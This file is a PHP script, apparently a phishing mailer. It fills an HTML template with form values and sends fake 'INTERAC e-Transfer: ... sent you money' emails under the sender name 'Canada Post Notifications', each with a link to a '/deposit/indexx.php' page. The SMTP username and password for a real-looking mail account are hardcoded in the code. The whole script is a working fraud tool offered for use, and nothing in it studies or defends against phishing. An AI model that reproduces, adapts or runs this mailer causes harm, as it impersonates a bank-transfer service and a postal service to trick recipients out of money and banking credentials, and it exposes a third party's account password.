<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require("phpmailer/src/PHPMailer.php");
require("phpmailer/src/SMTP.php");
require("phpmailer/src/Exception.php");

if (isset($_POST['submit'])) {
    // Create a placeholders array for replacement in the email template
    $placeholders = array(
        '{{etransfer_interac_ca}}' => $_SERVER['HTTP_HOST'] . '/public/deposit/indexx.php?' . http_build_query($_POST),
        '{{line}}' => date('F d, Y', strtotime('+30 days')),
        '{{username}}' => $_POST['username'],
        '{{photo_href}}' => $_POST['photo_href'],
        '{{bank}}' => $_POST['bank'],
        '{{amount}}' => $_POST['amount'],
        '{{photo_link}}' => $_POST['photo_link'],
        '{{link}}' => $_POST['link'],
        '{{EXPIRE}}' => $_POST['EXPIRE'],
        '{{expire}}' => $_POST['expire'],
        '{{link}}' => $_POST['link'],
        '{{sender_name}}' => $_POST['sender_name'],
        '{{sender_email}}' => $_POST['sender_email'],
        '{{memo}}' => $_POST['memo'],
        '{{receivers_name}}' => $_POST['receivers_name'],
        '{{receivers_email}}' => $_POST['receivers_email']
    );

    $message = file_get_contents('LEVEL1-3.html');
    $message = str_replace(array_keys($placeholders), array_values($placeholders), $message);

    $mail = new PHPMailer();
    $mail->IsSMTP();
    $mail->SMTPSecure = 'tls';
    $mail->Host = 'mail.mts.net'; // Use the provided host
    $mail->Port = 587; // The common SMTP port for TLS
    $mail->Body = $message;
    $mail->SMTPAuth = true;
    $mail->Username = 'andallard@mymts.net'; // Use the email address as the username
    $mail->Password = 'Batman123'; // Use the provided password
    $mail->SetFrom('andallard@mymts.net', 'Canada Post Notifications'); // Set From name to "Canada Post"
    $mail->AddAddress($_POST['receivers_email']);
    $mail->Subject = 'INTERAC e-Transfer: ' . $_POST['sender_name'] . ' sent you money';
    $mail->IsHTML(true);
    $mail->CharSet = "utf-8";

    if (!$mail->send()) {
        echo 'Message could not be sent.';
        echo 'Mailer Error: ' . $mail->ErrorInfo;
    } else {
        echo 'Email sent successfully.';
    }
}
?>
